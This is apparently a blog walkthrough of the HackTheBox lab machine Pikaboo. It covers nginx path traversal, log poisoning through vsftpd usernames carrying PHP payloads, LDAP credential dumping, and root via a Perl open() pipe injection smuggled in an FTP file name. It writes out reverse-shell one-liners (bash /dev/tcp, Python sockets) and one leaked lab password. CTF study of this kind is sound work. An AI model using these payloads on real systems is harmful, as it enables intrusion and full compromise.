---
title: "Walk-through of Pikaboo from HackTHeBox"
header:
  teaser: /assets/images/2021-11-16-22-06-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - vsFTPd
  - 
---

## Machine Information

![pikaboo](/assets/images/2021-11-16-22-06-12.png)

Pikaboo is a hard machine on HackTheBox. Our initial scan finds just three open ports, with the webserver being our starting point. We find a local file vulnerability that lets us access an admin area, from there we fuzz and find a log file. We use file poisoning to enable remote code execution giving us a reverse shell. Our path to root involves perl scripts, cronjobs, ldap scanning to eventually find credentials for the ftp server. From there we use a vulnerability to gain a reverse root shell by taking advantage of a badly written script.

<!--more-->

Skills required are good web and OS enumeration knowledge. Skills learned are researching exploits and methodically testing to find a working way forward.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Hard - Pikaboo](https://www.hackthebox.eu/home/machines/profile/360) |
| Machine Release Date | 17th July 2021 |
| Date I Completed It | 16th November 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# ports=$(nmap -p- --min-rate=1000 -T4  10.10.10.249  | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/pikaboo]
└─# nmap -p$ports -sC -sV -oA pikaboo 10.10.10.249
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-14 10:58 GMT
Nmap scan report for 10.10.10.249
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```

We have only three open ports. First add the server IP to our hosts file:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# echo "10.10.10.249 pikaboo.htb" >> /etc/hosts
```

Now have a look at the website on port 80:

![pikaboo-port80](/assets/images/2021-11-14-12-59-15.png)

It's an interesting static site:

![pikaboo-pokatex](/assets/images/2021-11-14-13-09-10.png)

There isn't anything of note on the main pages, but clicking on the admin link takes us to a login box. If we cancel that we end up here:

![pikaboo-unauthorized](/assets/images/2021-11-14-13-10-13.png)

This is because our nmap scan only found Nginx running on port 80, but here we have Apache on port 81. The localhost IP of 127.0.0.1 tells us that we are being passed locally within the box from port 80 to 81 when accessing this page.

Some searching around found [this](https://book.hacktricks.xyz/pentesting/pentesting-web/nginx) from Hacktricks which explains a local file vulnerability which allows us to read files outside of the web root.

Let's scan using that to look for anything useful:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# gobuster dir -t 100 -u http://pikaboo.htb/admin../ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pikaboo.htb/admin../
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/14 16:57:07 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 456]
/javascript           (Status: 301) [Size: 314] [--> http://127.0.0.1:81/javascript/]
/server-status        (Status: 200) [Size: 5898]                                     
===============================================================
2021/11/14 16:57:16 Finished
===============================================================
```

We find a server status page, detailed [here](https://httpd.apache.org/docs/2.4/mod/mod_status.html) on the Apache docs site we can see this would be interesting. Let's have a look:

![pikaboo-server-status](/assets/images/2021-11-14-17-05-58.png)

We find server information, and towards the bottom we have a list of running processes:

![pikaboo-process-list-](/assets/images/2021-11-14-17-07-46.png)

On that list we see another page called admin_staging, visiting that we see a dashboard:

![pikaboo-admin-staging](/assets/images/2021-11-14-13-19-19.png)

There's nothing much here but one thing to notice is the URL changes as we navigate around:

```text
http://pikaboo.htb/admin../admin_staging/index.php?page=user.php
http://pikaboo.htb/admin../admin_staging/index.php?page=tables.php
http://pikaboo.htb/admin../admin_staging/index.php?page=typography.php
```

We can fuzz that page= parameter to see if there are any other pages we haven't found. Hacktricks has a good guide [here](https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz) we can use:

```text
┌──(root💀kali)-[~/htb/pikaboo]
└─# wfuzz -c -f pikaboo,raw -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hl 367 -X POST -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
Total requests: 914
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000733:   200        413 L    1670 W     19803 Ch    "/var/log/vsftpd.log"
000000734:   200        557 L    1383 W     169659 Ch   "/var/log/wtmp"

Total time: 0
Processed Requests: 914
Filtered Requests: 912
Requests/sec.: 0
```

After a few iterations I came up with the above which restricts the output so we just dee something useful. The vsftpd.log file almost certainly relates to the FTP server we found on our nmap scan earlier.

Let's have a look at it:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
<SNIP>
Thu Jul  8 17:30:50 2021 [pid 21011] CONNECT: Client "::ffff:10.10.14.6"
Thu Jul  8 17:30:50 2021 [pid 21011] FTP response: Client "::ffff:10.10.14.6", "220 (vsFTPd 3.0.3)"
Thu Jul  8 17:30:53 2021 [pid 21011] FTP command: Client "::ffff:10.10.14.6", "USER pwnmeow"
Thu Jul  8 17:30:53 2021 [pid 21011] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "331 Please specify the password."
Thu Jul  8 17:31:01 2021 [pid 21011] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "PASS <password>"
Thu Jul  8 17:31:01 2021 [pid 21010] [pwnmeow] OK LOGIN: Client "::ffff:10.10.14.6"
Thu Jul  8 17:31:01 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "230 Login successful."
Thu Jul  8 17:31:01 2021 [pid 21035] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "SYST"
Thu Jul  8 17:31:01 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "215 UNIX Type: L8"
Thu Jul  8 17:31:03 2021 [pid 21035] [pwnmeow] FTP command: Client "::ffff:10.10.14.6", "QUIT"
Thu Jul  8 17:31:03 2021 [pid 21035] [pwnmeow] FTP response: Client "::ffff:10.10.14.6", "221 Goodbye."
```

We've retrieved the FTP log file, which reveals a username pwnmeow. After a while looking around I looked for an exploit and found [this](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-vsftpd-logs) method of file inclusion. Further info [here](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d) and [here](https://secnhack.in/ftp-log-poisoning-through-lfi/) helped me figure out the next move.

We can connect to the FTP server and use the method described to execute arbitary code. First lets test our theory:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# ftp pikaboo.htb
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): <?php exec("/bin/bash -c 'ping -c 4 10.10.14.43'"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

This has put our code in to the FTP log file, now we need to read the log to cause it to be executed:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

Switch to another terminal with tcpdump listening for that ping:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:35:05.976732 IP pikaboo.htb > 10.10.14.43: ICMP echo request, id 4420, seq 1, length 64
21:35:05.976741 IP 10.10.14.43 > pikaboo.htb: ICMP echo reply, id 4420, seq 1, length 64
21:35:06.975411 IP pikaboo.htb > 10.10.14.43: ICMP echo request, id 4420, seq 2, length 64
21:35:06.975420 IP 10.10.14.43 > pikaboo.htb: ICMP echo reply, id 4420, seq 2, length 64
21:35:07.976764 IP pikaboo.htb > 10.10.14.43: ICMP echo request, id 4420, seq 3, length 64
21:35:07.976773 IP 10.10.14.43 > pikaboo.htb: ICMP echo reply, id 4420, seq 3, length 64
21:35:08.978070 IP pikaboo.htb > 10.10.14.43: ICMP echo request, id 4420, seq 4, length 64
21:35:08.978080 IP 10.10.14.43 > pikaboo.htb: ICMP echo reply, id 4420, seq 4, length 64
```

We capture the ping coming from the box which proves we successfully executed code. Let's try and get a reverse shell, I used a simple one from [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# ftp pikaboo.htb
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.43/1337 0>&1'"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

Our code is placed in the log, now read it to execute:

```sh
┌──(root💀kali)-[~/htb/pikaboo]
└─# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

Switch to a waiting netcat listener to see we are connected:

```sh
┌──(root💀kali)-[~]
└─# nc -lvvp 1337
listening on [any] 1337 ...
connect to [10.10.14.43] from pikaboo.htb [10.10.10.249] 55792
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@pikaboo:/var/www/html/admin_staging$ 
```

Let's get the user flag first:

```text
www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home
drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow

www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home/pwnmeow
-r--r----- 1 pwnmeow www-data 33 Nov 12 21:55 user.txt

www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt
<HIDDEN>
```

I spent a fair amount of time looking around, when I got to the system crontab I noticed something interesting:

```text
www-data@pikaboo:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```

That last line is running the csvupdate_cron job every minute as root. Let's have a look:

```text
www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron
cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

We see that job is looping through all files found in the folder /srv/ftp, for each one it runs the script csvupdate taking the filename as a parameter.

Looking at the csvupdate script we find a lengthy Perl script:

```text
www-data@pikaboo:/$ cat /usr/local/bin/csvupdate
#!/usr/bin/perl
##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";
```

The description tells us it's used to upgrade data, and looking further at the contents we see this section towards the end:

```perl
my $csv = Text::CSV->new({ sep_char => ',' });
my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";
```

This looks to be taking the filename, checking it ends with .csv then uses the open command on it. I didn't know where to go with that right now so moved on to further enumeration of the file system.

When I looked at sockets I see LDAP on port 389 listening at 127.0.0.1:

```text
www-data@pikaboo:/var/www/html/admin_staging$ ss -tln
ss -tln
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         128                0.0.0.0:80               0.0.0.0:*       
LISTEN    0         128              127.0.0.1:81               0.0.0.0:*       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*       
LISTEN    0         128              127.0.0.1:389              0.0.0.0:*       
LISTEN    0         128                   [::]:80                  [::]:*       
LISTEN    0         32                       *:21                     *:*       
LISTEN    0         128                   [::]:22                  [::]:*
```

Another internal system, which must be used for something. Again back to looking around and I found some config files for pokeapi:

```text
www-data@pikaboo:/$ ls -l /opt/pokeapi/config
-rwxr-xr-x 1 root root    0 Jul  6 20:17 __init__.py
drwxr-xr-x 2 root root 4096 Jul  6 16:10 __pycache__
-rw-r--r-- 1 root root  783 Jul  6 20:17 docker-compose.py
-rwxr-xr-x 1 root root  548 Jul  6 20:17 docker.py
-rwxr-xr-x 1 root root  314 Jul  6 20:17 local.py
-rwxr-xr-x 1 root root 3080 Jul  6 20:17 settings.py
-rwxr-xr-x 1 root root  181 Jul  6 20:17 urls.py
-rwxr-xr-x 1 root root 1408 Jul  6 20:17 wsgi.py
```

The settings file was useful:

```text
www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py
<SNIP>
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "<HIDDEN>",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
```

We see an ldap section with credentials, and looking on the box we have ldapsearch available. Using [this](https://docs.oracle.com/cd/E19693-01/819-0997/auto45/index.html) helpful document I found this section:

```text
Returning All Entries
Given the previous information, the following call will return all entries in the directory:

ldapsearch -h myServer -p 5201 -D cn=admin,cn=Administrators,cn=config
 -b "dc=example,dc=com" -s sub "(objectclass=*)"
"(objectclass=*)" is a search filter that matches any ent
```

Which I used with the creds we just found to dump all LDAP entries:

```text
twww-data@pikaboo:/$ ldapsearch -h 127.0.0.1 -p 389 -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' -s sub "(objectClass=*)"
<]g' -b 'dc=pikaboo,dc=htb' -s sub "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp
```

The output is quite long but this section is what I wanted:

```text
# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: <HIDDEN>
```

That password is clearly base64 encoded as it has the tell tale double == on the end:

```text
www-data@pikaboo:/$ echo "<HIDDEN>" | base64 -d
echo "<HIDDEN>" | base64 -d
<HIDDEN>
```

Decoding gives us a plaintext password. Let's try to ftp in with these credentials:

```text
┌──(root💀kali)-[~/htb/pikaboo]
└─# ftp pikaboo.htb
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx-wx---    2 ftp      ftp          4096 Nov 13 08:47 abilities
drwx-wx---    2 ftp      ftp          4096 May 20 07:01 ability_changelog
drwx-wx---    2 ftp      ftp          4096 May 20 07:01 ability_changelog_prose
drwx-wx---    2 ftp      ftp          4096 May 20 07:01 ability_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20 07:01 ability_names
```

Unsurprisingly it works and we're in. There's nothing much to look at which had me stumped for quite some time. Eventually I looked back at that Perl script we found, and some searching for vulnerabilities around the open command it uses gave me a whole host of information:

[https://cheatsheet.haax.fr/linux-systems/programing-languages/perl](https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/)

[https://stackoverflow.com/questions/26614348/perl-open-injection-prevention](https://stackoverflow.com/questions/26614348/perl-open-injection-prevention)

[https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543)

[https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf](https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf)

[https://perl-begin.org/topics/security/code-markup-injection](https://perl-begin.org/topics/security/code-markup-injection/)

After a lot of reading and trial and error I found we could exploit the csvupdate Perl script by uploading a file and renaming it so the starting character is a pipe. Then we get code execution of anything after it.

I tried a classic Pentestmonkey [Python reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) which didn't work. A simpler one used on other boxes did work though.

To exploit this we need our file to be called this once it's uploaded via ftp:

```text
"|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.239\",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""\"sh\",""\"-i\"])';.csv"
```

Notice the first character is the pipe then the code after gets executed. Which for the above will use Python to open that shell back to us on Kali. Also see that I've had to do an number of extra backslashes to ensure special characters are processed properly.

With that command changed to have our Kali tun0 IP and port we just paste it in as part of the put command. First log in to FTP:

```text
┌──(root💀kali)-[~/htb/pikaboo]
└─# ftp pikaboo.htb
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Change to a different folder from the root one as we haven't got rights there:

```text
ftp> cd versions
250 Directory successfully changed.
```

Use the put command, we need a local file to upload here I've just created a blank one called test. Then we paste our command from above on the end:

```text
ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.239\",1338));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
local: test remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.239",1338));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> 
```

The file called test is renamed to our payload as it's uploaded. Now switch to a waiting netcat listener to see we have a reverse shell connected as root:

```text
┌──(root💀kali)-[~/htb/pikaboo]
└─# nc -lvvp 1338
listening on [any] 1338 ...
connect to [10.10.14.239] from pikaboo.htb [10.10.10.249] 52370
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

You have to wait for the script to run which is every minute so it doesn't take long. Now we can finally get the root flag:

```text
# ls /root
root.txt  vsftpd.log

# cat /root/root.txt
<HIDDEN>
```

For me that really was a hard box, but some good learning from it so worth the effort.

All done. See you next time.
